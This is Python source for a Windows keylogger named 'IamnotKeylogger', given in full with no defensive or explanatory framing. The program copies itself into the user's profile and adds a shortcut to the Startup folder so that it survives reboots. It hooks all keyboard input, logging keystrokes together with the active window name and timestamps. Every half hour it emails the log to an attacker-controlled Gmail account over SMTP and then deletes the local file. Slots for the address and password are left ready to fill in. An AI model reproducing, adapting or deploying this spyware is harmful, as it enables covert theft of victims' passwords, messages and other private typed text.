import pythoncom, os, sys
from getpass import getuser
from datetime import datetime
from email.mime.text import MIMEText
from shutil import copy
from getpass import getuser
from winshell import shortcut
from smtplib import SMTP
from threading import Timer
from PyHook3 import HookManager

TO_EMAIL = 'youremail@gmail.com'
PS_EMAIL = 'yourpassword'
PERIOD = 1800.0 #seconds
TARGET_NAME = 'target 1'
SVR_MAIL = 'smtp.gmail.com:587'
KEYDOWN = 'key down | key sys down'
KEYUP = 'key up'
DOWN = 'down'
UP = 'up'

# Copy exec file to this folder
user_name = getuser()
exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name) 
if not os.path.exists(exec_path):
    os.makedirs(exec_path)
    copy(sys.executable, exec_path)

# Create the shortcut of this exec at Startup folder
lnk_name = 'IamnotKeylogger.lnk'
lnk_filepath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%s' %(user_name, lnk_name)
if not os.path.exists(lnk_filepath):
    shct = shortcut(exec_path + '\\' + os.path.basename(sys.executable))
    shct.write(lnk_filepath)

curr_date = datetime.now().strftime("%Y-%b-%d")
log_path =  r'%s\keylogs-%s.txt' %(exec_path, curr_date)
curr_window = ''
special_key = [None] * 3
special_key[2] = 0

# The event is triggered when a user inputs from a keyboard
def OnKeyboardEvent(event):
    global curr_window
    log_file = open(log_path, 'a')
    if curr_window != event.WindowName: # Check the current window
        try:
            curr_window = event.WindowName
            log_file.write('\n\n================================================\n')
            log_file.write('Program: ' + curr_window)
            log_file.write('\nTime: ' + datetime.now().strftime("%Y-%b-%d %H:%M") + '\n')

            print('================================================')
            print('Program: ' + curr_window)
            print('Time: ' + datetime.now().strftime("%Y-%b-%d %H:%M"))

        except Exception as e:
            err_msg = 'ERROR Type: {0}. Args: {1!r}'.format(type(e).__name__, e.args)
            err_msg = str(err_msg.encode('ascii', 'replace'))[2:-1]

            print(err_msg)
            log_file.write('\n' + err_msg + '\n')

    if event.MessageName in KEYDOWN: # When a key is down
        if (event.Ascii < 32 or event.Ascii > 126): # Catch special keys
            if len(event.Key) == 1: # Handle the keys that are with Ctrl key
                print(event.Key)
                log_file.write(event.Key)

            elif special_key[0] != event.Key or special_key[1] != DOWN: # Prevent duplicate keys
                special_key[0] = event.Key
                special_key[1] = DOWN
                print('[%s %s]' %(event.Key, DOWN))
                log_file.write('[%s %s]' %(event.Key, DOWN))

            if event.Ascii == 8 or event.Key == 'Delete': # Handle backspace or delete keys
                special_key[2] = special_key[2] + 1

        else: # Numbers and characters
            print(chr(event.Ascii))
            log_file.write(chr(event.Ascii))

    if event.MessageName in KEYUP: # When a key is down
        if (event.Ascii < 32 or event.Ascii > 126) and len(event.Key) > 1: # Catch special keys
            if event.Ascii == 8 or event.Key == 'Delete': # Display times when pressing backspace or delete
                print(' x ' + str(special_key[2]))
                log_file.write('x ' + str(special_key[2]))
                special_key[2] = 0

            special_key[0] = event.Key
            special_key[1] = UP
            print('[%s %s]' %(event.Key, UP))
            log_file.write('[%s %s]' %(event.Key, UP))

            if event.Ascii == 13: # Enter key
                log_file.write('\n')

    log_file.close()
    return True

# Send an email to a specific address
def send_email():
    log_file = open(log_path, 'r')
    msg = MIMEText(log_file.read())
    log_file.close()

    msg['Subject'] = TARGET_NAME + ' and ' + os.path.basename(log_path)
    msg['From'] = TARGET_NAME
    msg['To'] = TO_EMAIL
    mail_svr = SMTP(SVR_MAIL)
    mail_svr.starttls()
    mail_svr.login(TO_EMAIL, PS_EMAIL)
    mail_svr.sendmail(TARGET_NAME, TO_EMAIL, msg.as_string())
    mail_svr.quit()

# Call send_email function periodically
def send_email_period():
    Timer(PERIOD, send_email_period).start()
    if os.path.isfile(log_path):
        send_email()
        os.remove(log_path)

# Main handle
send_email_period()
hm = HookManager()
hm.KeyDown = OnKeyboardEvent
hm.KeyUp = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
